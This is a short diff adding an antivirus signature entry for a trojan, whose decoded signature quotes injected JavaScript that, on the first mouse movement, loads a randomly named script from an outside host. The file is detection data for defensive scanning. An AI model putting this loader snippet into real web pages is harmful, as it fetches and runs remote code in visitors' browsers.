@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Agent-36721
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: *
+DECODED SIGNATURE:
+var x = jquery.noconflict(true);x(function() {var flag = 0;x(window).mousemove(function() {if (flag === 0) {flag = 1;x.getscript('http://firefoxstabs.com/' + math.random().tostring().substring(3) + '.js', function() {flag = 2;});
